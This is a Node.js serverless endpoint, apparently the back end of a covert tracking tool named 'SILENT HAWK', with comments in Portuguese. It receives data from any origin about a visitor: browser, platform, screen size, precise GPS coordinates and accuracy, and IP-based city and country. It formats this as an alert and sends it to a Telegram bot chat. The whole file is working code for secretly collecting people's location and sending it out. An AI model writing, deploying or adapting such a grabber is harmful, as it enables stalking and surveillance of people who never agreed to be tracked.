const axios = require('axios')

module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    res.setHeader('Access-Control-Allow-Headers', '*')
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end()
    }

    try {
        console.log('📩 Request received for /api/capture', req.method)
        
        let data = {}
        if (req.method === 'POST') {
            data = req.body || {}
            console.log('POST body:', JSON.stringify(data, null, 2))
        } else if (req.method === 'GET' && req.query.data) {
            data = JSON.parse(decodeURIComponent(req.query.data))
            console.log('GET data:', JSON.stringify(data, null, 2))
        } else {
            return res.status(400).json({ error: 'Método não suportado ou dados faltando' })
        }

        // Construir mensagem para Telegram
        let message = `🚨 *SILENT HAWK - CAPTURE* 🚨\n\n`
        message += `📱 *User Agent:* ${data.userAgent || 'N/A'}\n`
        message += `💻 *Platform:* ${data.platform || 'N/A'}\n`
        message += `🌐 *Language:* ${data.language || 'N/A'}\n`
        message += `⏰ *Timestamp:* ${new Date().toLocaleString('pt-BR')}\n`
        message += `🖥️ *Resolution:* ${data.screen?.width || 'N/A'}x${data.screen?.height || 'N/A'}\n`

        if (data.geolocation) {
            message += `\n📍 *GPS LOCATION:*\n`
            message += `• Lat: ${data.geolocation.latitude}\n`
            message += `• Long: ${data.geolocation.longitude}\n`
            message += `• Accuracy: ${data.geolocation.accuracy}m\n`
            message += `• 🗺️ [Google Maps](https://maps.google.com/?q=${data.geolocation.latitude},${data.geolocation.longitude})\n`
        }

        if (data.ipLocation) {
            message += `\n🌍 *IP TRIANGULATION:*\n`
            message += `• IP: ${data.ipLocation.ip || data.ipLocation.query || 'N/A'}\n`
            message += `• City: ${data.ipLocation.city || data.ipLocation.regionName || 'N/A'}\n`
            message += `• Country: ${data.ipLocation.country_name || data.ipLocation.country || 'N/A'}\n`
        }

        // Enviar para Telegram
        const token = process.env.TELEGRAM_BOT_TOKEN
        const chatId = process.env.TELEGRAM_CHAT_ID

        if (!token || !chatId) {
            throw new Error('Variáveis de ambiente TELEGRAM_BOT_TOKEN ou TELEGRAM_CHAT_ID não configuradas')
        }

        console.log('Enviando para Telegram...')
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        })

        console.log('Mensagem enviada com sucesso para Telegram')
        res.status(200).json({ success: true, message: 'Dados enviados' })
    } catch (error) {
        console.error('❌ Erro em capture.js:', error.message)
        res.status(500).json({ error: error.message })
    }
}
